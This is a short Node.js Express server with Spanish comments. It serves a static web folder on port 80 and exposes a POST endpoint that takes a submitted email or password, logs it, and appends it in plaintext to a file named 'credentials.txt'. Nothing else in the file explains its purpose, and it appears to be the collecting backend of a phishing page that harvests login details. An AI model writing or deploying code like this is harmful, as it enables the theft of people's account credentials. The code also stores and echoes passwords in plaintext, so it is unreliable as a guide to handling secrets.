const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 80;

// ✅ Middleware para parsear JSON del body
app.use(express.json());

// Servir archivos estáticos desde ../../web
app.use('/', express.static(path.join(__dirname, '../../web')));

// Ruta para recibir datos POST
app.post('/api/datos', (req, res) => {
    const datos = req.body;
    console.log('Datos recibidos:', datos);

    const filePath = path.join(__dirname, 'credentials.txt');

    // Validar que se reciba un email o password
    if (!datos.email && !datos.password) {
        return res.status(400).json({
            success: false,
            mensaje: 'No se recibieron datos válidos'
        });
    }

    // Determinar qué guardar
    let contenido = '';
    if (datos.email) {
        contenido = datos.email;
    } else if (datos.password) {
        contenido = datos.password;
    }

    // Escribir en el archivo
    fs.appendFile(filePath, contenido + "\n", (err) => {
        if (err) {
            console.error('Error al escribir en el archivo:', err);
            return res.status(500).json({
                success: false,
                mensaje: 'Error al guardar los datos'
            });
        }
        // Respuesta exitosa
        res.json({
            success: true,
            mensaje: 'Datos recibidos correctamente',
            datos
        });
    });
});
// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor corriendo en puerto ${PORT}`);
});

